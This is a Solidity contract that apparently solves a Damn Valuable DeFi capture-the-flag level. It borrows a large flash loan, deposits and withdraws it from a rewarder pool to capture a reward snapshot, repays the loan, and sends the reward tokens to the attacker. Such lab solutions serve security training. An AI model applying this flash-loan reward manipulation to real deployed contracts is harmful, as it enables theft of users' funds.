// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";
import "hardhat/console.sol";

contract RewarderPoolAttacker {
    address attacker;
    FlashLoanerPool flashPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    constructor(address _flashPoolAddress, address _rewarderPoolAddress, address _tokenAddress, address _rewardToken) {
        flashPool = FlashLoanerPool(_flashPoolAddress);
        rewarderPool = TheRewarderPool(_rewarderPoolAddress);
        liquidityToken = DamnValuableToken(_tokenAddress);
        rewardToken = RewardToken(_rewardToken);
        attacker = msg.sender;
    }

    function Attack() public {
        require(msg.sender == attacker, "Only attacker can attack");
        flashPool.flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashPool), amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
